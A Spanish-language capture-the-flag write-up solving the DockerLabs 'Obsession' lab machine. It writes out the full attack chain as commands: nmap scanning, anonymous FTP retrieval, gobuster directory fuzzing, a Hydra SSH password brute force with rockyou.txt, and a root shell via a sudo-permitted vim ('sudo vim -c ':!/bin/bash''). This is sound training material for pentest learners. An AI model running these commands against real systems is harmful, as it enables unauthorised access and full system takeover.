# 🎯 Writeup: DockerLabs - Obsession (Dificultad Fácil)

![Dificultad](https://img.shields.io/badge/Dificultad-Fácil-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)
![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-orange?style=for-the-badge)

## 📝 Introducción
En este writeup detallo el proceso de resolución de la máquina **Obsession** de la plataforma DockerLabs. La máquina presenta un nivel de dificultad fácil y pone a prueba habilidades básicas de enumeración de servicios, análisis de información expuesta, ataques de fuerza bruta y escalada de privilegios mediante malas configuraciones en el sistema.

---

## 🚀 Despliegue de la Máquina
Para comenzar, desplegamos la máquina utilizando el script proporcionado por DockerLabs.

```bash
sudo bash auto_deploy.sh obsession.tar
```

Una vez desplegada, la máquina obtiene la dirección IP `172.17.0.3`.

---

## 🔍 Reconocimiento (Reconnaissance)
El primer paso es realizar un escaneo de puertos y servicios para identificar la superficie de ataque.

```bash
nmap -sS -sV -sC -Pn -n 172.17.0.3
```

**Resultados del escaneo:**
- **Puerto 21 (FTP):** `vsftpd 3.0.5` (Permite acceso anónimo).
- **Puerto 22 (SSH):** `OpenSSH 9.6p1`.
- **Puerto 80 (HTTP):** `Apache httpd 2.4.58` (Título: Russoski Coaching).

---

## 🕵️ Enumeración (Enumeration)

### 1. Enumeración FTP
Aprovechando que el servicio FTP permite el inicio de sesión anónimo (*Anonymous FTP login allowed*), procedemos a conectarnos y listar los archivos disponibles.

```bash
ftp 172.17.0.3
# Login: anonymous
# Password: (vacío)
```

Listamos y descargamos los archivos `chat-gonza.txt` y `pendientes.txt`:

```text
ftp> ls
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
ftp> get chat-gonza.txt
ftp> get pendientes.txt
ftp> exit
```

**Análisis de la información extraída:**
- 📄 **`chat-gonza.txt`**: Russoski menciona tener un vídeo de una chica llamada "Nágore" guardado en una "ruta segura" de su ordenador.
- 📄 **`pendientes.txt`**: Russoski anota tareas pendientes. Destaca un punto crítico: *"Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos permisos habilitados que no son del todo seguros.."*. Esto nos da una gran pista sobre la futura escalada de privilegios.

### 2. Enumeración Web
Al acceder al puerto 80, observamos una página web estática de coaching personal. Para buscar rutas ocultas, realizamos un fuzzing de directorios con Gobuster.

```bash
gobuster dir -u [http://172.17.0.3/](http://172.17.0.3/) -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x php,html,txt,bak,zip,jpg
```

El escaneo revela dos directorios interesantes:
- `http://172.17.0.3/backup/`
- `http://172.17.0.3/important/`

Accediendo al directorio `/backup/`, encontramos el archivo `backup.txt`, el cual contiene una nota:

> *"Usuario para todos mis servicios: **russoski** (cambiar pronto!)"*

Con esto, ya tenemos un nombre de usuario válido (`russoski`).

---

## 💥 Explotación (Exploitation)
Sabiendo que el puerto 22 (SSH) está abierto y tenemos el usuario `russoski`, procedemos a realizar un ataque de fuerza bruta con Hydra utilizando el diccionario clásico `rockyou.txt`.

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3
```

Hydra encuentra rápidamente las credenciales válidas:
- 👤 **Usuario:** `russoski`
- 🔑 **Contraseña:** `xxxxxxxx`

Procedemos a conectarnos por SSH al servidor:

```bash
ssh russoski@172.17.0.3
# Password: xxxxxxxxxx
```

---

## 👑 Escalada de Privilegios (Privilege Escalation)
Una vez dentro de la máquina como el usuario `russoski`, lo primero que hacemos es verificar nuestros privilegios sudo.

```bash
sudo -l
```

**Salida del comando:**
```text
User russoski may run the following commands on 129a97c913d3:
    (root) NOPASSWD: /usr/bin/vim
```

El usuario puede ejecutar `vim` como root sin necesidad de contraseña. Esta es una vulnerabilidad clásica documentada en GTFOBins. Aprovechamos la capacidad de `vim` para ejecutar comandos del sistema.

```bash
sudo vim -c ':!/bin/bash'
```

Al ejecutar este comando, obtenemos una shell interactiva como el usuario root (`#`).

---

## 🏁 Captura de la Flag
Finalmente, como usuarios root, nos dirigimos al directorio `/root` para leer el archivo que contiene la flag (y que guarda relación con la conversación que encontramos en el FTP).

```bash
cd /root
ls
# Video-Nagore-Fernandez.txt

cat Video-Nagore-Fernandez.txt
```

**Resultado:**
```text
Al fin lo terminé! es tan hermosa.. <3

[https://www.youtube.com/shorts/_v8GzGReTAk](https://www.youtube.com/shorts/_v8GzGReTAk)
```

**¡Máquina comprometida con éxito!** 🚩

---

## 📌 Conclusión
La máquina Obsession es un excelente reto para principiantes que están aprendiendo el flujo de trabajo de un pentest. Nos enseña la importancia de:
1. **Revisar configuraciones por defecto o débiles:** Como el acceso FTP anónimo.
2. **Correlación de hallazgos:** Extraer y correlacionar información de diferentes servicios (Web y FTP).
3. **Auditoría de permisos locales:** Auditar los permisos de `sudo` para encontrar binarios mal configurados que permitan ejecutar comandos del sistema.

¡Happy Hacking! 🐧💻
